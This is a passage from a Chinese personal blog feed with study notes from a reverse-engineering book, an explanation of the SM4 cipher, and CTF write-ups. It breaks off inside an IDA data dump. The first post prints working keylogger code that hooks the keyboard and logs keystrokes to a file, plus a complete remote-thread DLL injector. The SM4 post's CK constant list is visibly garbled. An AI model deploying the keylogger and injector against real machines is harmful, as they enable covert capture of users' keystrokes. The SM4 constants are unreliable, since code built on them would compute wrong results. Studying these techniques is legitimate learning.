class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F1: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F1]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F2: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F2]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F3: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F3]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F4: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F4]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F5: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F5]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F6: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F6]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F7: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F7]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F8: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F8]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F9: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F9]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F10: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F10]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F11: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F11]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F12: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F12]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">BYTE ks[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">GetKeyboardState</span>(ks);</span><br><span class="line">WORD w;</span><br><span class="line">UINT scan = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ToAscii</span>(wParam, scan, ks, &amp;w, <span class="number">0</span>);</span><br><span class="line">ch[<span class="number">0</span>] = <span class="built_in">char</span>(w);</span><br><span class="line">ch[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">writeToFile</span>(ch);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时dllmain就可以什么都不干了，只用找到当前进程句柄就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HMODULE hinstDLL,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  dwReason,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以在固定位置生成文件写入按键了，上面的代码参考了github上的一个项目</p><hr><h2 id="DLL注入">DLL注入</h2><p>从外部促使目标进程调用LoadLibrary的API使得执行DLLMain</p><p>书上只写了两种方法，之后有机会试一试反射注入，听说效果更好</p><p>第一种：</p><p>远程线程注入，创建一个远程线程代替原本进程注入进去，</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>其中第4个参数（如果没有第二个可选参数就是第三个）是线程回调函数地址，当创建好线程后，这个线程就会执行这个函数。其最终的传入参数是CreateRemoteThread的第5个参数，这里它一定是一个指针，所以如果要传入多个参数的话需要一些数据结构，比如数组指针或者结构体指针。</p><p>由于传入参数是一个指针，而一个进程只能访问它拥有的内存空间，所以为了把dll成功注入，需要先把参数写到目标进程的内存中</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Ret_maybenull_</span><br><span class="line">_Post_writable_byte_size_(dwSize)</span><br><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>是用于在目标进程内申请空间并返回对应指针的函数</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Success_(<span class="keyword">return</span> != FALSE)</span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>这个是写入内存的函数，第二个参数是之前申请到的地址，第三个参数是写入的内容。</p><p>然后就可以直接用第二个参数当写入内容的指针了</p><p>inject函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//取得对应PID句柄</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//申请内存</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//写入地址</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//获取LodaLibrary地址</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">pBuf,<span class="comment">//传参</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;create hThread failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//等待线程结束</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在测试中，得知了x86的进程，那么注入器和dll也要是x86的，x64的也一样</p><p>还没学DLL卸载QAQ</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> DLL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密04-SM4</title>
      <link href="/posts/77e5000d.html"/>
      <url>/posts/77e5000d.html</url>
      
        <content type="html"><![CDATA[<p>好耶，不用介绍了，</p><p><a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">文档连接</a></p><p>感觉和AES加密差不多</p><h1>SM4/SMS4</h1><h2 id="性质">性质</h2><p>分组算法，分组长度位128位，密钥长度位128位</p><h2 id="过程">过程</h2><h3 id="加密">加密</h3><p>32次迭代</p><p>输入为X0到X4共十六字节，每个X有4字节，通过轮密钥运算生成X0对应的X5…以此类推，直到生成了X32,X33,X34,X35</p><p>具体来说<br>$$<br>X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)<br>$$</p><p>其中F为轮函数：<br>$$<br>F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i) = X_0\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i)<br>$$</p><p>其中T为合成置换，$T(x) = L(\tau)$，其中L是线性变换，$\tau$是非线性变换</p><p>对于$\tau$,</p><p>把输入的四个值转为hex，查S盒，得到下一个值</p><p><img src="https://s2.loli.net/2024/06/05/ZCGLwJEIuyHD5VO.png" alt="image-20240605162119411"></p><p>得到转化后的4个值记为B</p><p>结果C=<br>$$<br>L(B)=B\oplus(B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)<br>$$<br>&lt;&lt;&lt;是32位循环左移</p><p>1次反序变换</p><p>将结果变为X35,X34,X33,X32</p><h3 id="密钥扩展">密钥扩展</h3><p>FK系统参数  CK固定参数 MK输入密钥一共4个</p><p>轮密钥由加密密钥生成</p><p>加密密钥K0到K3由$MK_i$和$FK_i$异或得到</p><p>后面的则是$rK_i$=<br>$$<br>K_{I+4}=K_i \oplus T’(K_{i+1} \oplus K_{i+2} \oplus K_{i+3}\oplus CK_i)<br>$$<br>T’是将T的线性变换L换成下面的L‘：<br>$$<br>L’(B)=B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)<br>$$</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FK0</span> <span class="operator">=</span> A3B1BAC6</span><br><span class="line"><span class="attribute">FK1</span> <span class="operator">=</span> <span class="number">56</span>AA3350</span><br><span class="line"><span class="attribute">FK2</span> <span class="operator">=</span> <span class="number">677</span>D9197</span><br><span class="line"><span class="attribute">FK3</span> <span class="operator">=</span> B27022DC</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CK = [<span class="number">00070E15</span>，1C232A31,383F464D,<span class="number">545B6269</span>，<span class="number">70777E85</span>,8C939AA1,A8AFB6BD,C4CBD2D9E0E7EEF5FC030A11,181F262D,<span class="number">343B4249</span>，<span class="number">50575E65</span>，6C737A81,888F969D,A4ABB2B9，C0C7CED5,DCE3EAF1,F8FF060D,<span class="number">141B2229</span>，<span class="number">30373E45</span>,4C535A61，686F767D<span class="number">.848B9299</span>.A0A7AEB5，IBCC3CAD1,D8DFE6ED,F4FB0209<span class="number">.10171E25</span>,2C333A41,484F565D,<span class="number">646B7279</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录（4）</title>
      <link href="/posts/22913c82.html"/>
      <url>/posts/22913c82.html</url>
      
        <content type="html"><![CDATA[<h1>litctf</h1><h2 id="ezpy">ezpy</h2><p>这个文件一看是python打包的</p><p>然后本身解包很简单，但是找主函数调用的库找不到QAQ</p><p>但是exe可以执行，那么肯定库是在的</p><p>根据<a href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstaller打包的exe之一键反编译py脚本与防反编译_pyinstaller防止反编译-CSDN博客</a></p><p>查找资料，通过把PYZ-00.pyz打开查看内容找到最后的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyi-archive_viewer ezpy.exe</span><br><span class="line">o PYZ-00.pyz</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x xxx.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure><p>然后就和普通的操作一样了</p><h1>CISCN</h1><h2 id="asm-re">asm_re</h2><p>这个是arm的汇编，看起来有点难QAQ</p><p>写脚本把代码跑出来又不是很现实</p><p>所以尝试丢给ai，写脚本解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 原始数据</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__const:0000000100003F10 D7                            unk_100003F10 DCB 0xD7                  ; DATA XREF: _main+34↑o</span></span><br><span class="line"><span class="string">__const:0000000100003F11 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F12 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F13 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F14 B7                            DCB 0xB7</span></span><br><span class="line"><span class="string">__const:0000000100003F15 21                            DCB 0x21 ; !</span></span><br><span class="line"><span class="string">__const:0000000100003F16 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F17 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F18 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F19 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F1A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1C 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F1D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F1E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F20 E7                            DCB 0xE7</span></span><br><span class="line"><span class="string">__const:0000000100003F21 26                            DCB 0x26 ; &amp;</span></span><br><span class="line"><span class="string">__const:0000000100003F22 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F23 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F24 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F25 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F26 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F27 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F28 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F29 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F2A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F2D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F2E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F30 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F31 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F32 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F33 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F34 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F35 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F36 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F37 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F38 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F39 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F3D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F40 F7                            DCB 0xF7</span></span><br><span class="line"><span class="string">__const:0000000100003F41 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F42 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F43 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F44 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F45 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F46 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F47 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F48 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F49 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F4A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F4D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F4E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F50 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F51 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F52 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F53 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F54 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F55 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F56 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F57 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F58 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F59 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F5D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F60 67                            DCB 0x67 ; g</span></span><br><span class="line"><span class="string">__const:0000000100003F61 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F62 00                            DCB   